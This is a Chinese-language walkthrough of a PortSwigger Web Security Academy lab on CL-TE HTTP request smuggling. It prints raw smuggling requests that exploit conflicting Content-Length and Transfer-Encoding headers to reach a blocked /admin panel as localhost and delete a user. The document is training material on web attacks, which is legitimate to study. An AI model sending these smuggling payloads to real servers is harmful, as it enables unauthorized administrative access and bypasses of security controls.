#### CL-TE绕过前端服务器安全控制

**实验地址**：https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te

**实验描述**：

本实验中包括一个前端和后端服务器，前端服务器不支持chunked encoding。同时本实验存在管理员系统/admin，但前端服务器限制了直接访问它。

要完成本实验，需向后端服务器走私一个http请求以访问到管理员系统并删除名为`carlos`的用户。

**实验过程**

分别访问/home和/admin，前者显示`"Not Found"`，后者显示`"Path /admin is blocked"`

![](images/security_wiki/15905476895690.png)

![](images/security_wiki/15905476937179.png)


已提示CL-TE，即前端只识别`Content-Length`，后端只识别`Transfer-Encoding`

构造一个走私请求

```bash
GET /home HTTP/1.1
Host: ac6c1fff1e1b83fa809c15fe009a008d.web-security-academy.net
Connection: close
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: session=ZZT6WpfyCJOaSO3LiMQrzMhEU7gIW0GE
Content-Length: 24
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1

```

根据返回消息可知需要使用POST方法

多次发送请求后收到提示：需要以localhost形式访问/admin

如果不成功需要多次发送请求

![](images/security_wiki/15905477084740.png)


添加`Host: localhost`后多次发送请求

![](images/security_wiki/15905477162717.png)


提示：不允许提交重复的header names，此处官网给出的解释是：

> Observe that the request was blocked due to the second request’s Host header conflicting with the smuggled Host header in the first request.
> 
> Issue the following request twice so the second request’s headers are appended to the smuggled request body instead:
> 
> * * *

```bash
POST / HTTP/1.1
Host: your-lab-id.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=  

```

简言之，由于第二个请求的`Host header`与第一个请求中走私请求的`Host header`冲突，请求被阻止。

因此构造以上请求，在发送两次请求的时候，可将第二个请求http数据包附加到走私请求主体中，拼接在x=之后，成为一个请求。

最后构造删除请求即可

![](images/security_wiki/15905477615642.png)


当然这里可以不采用以上方法，多次发送请求仍有概率成功，但成功率无法保证

![](images/security_wiki/15905477680868.png)


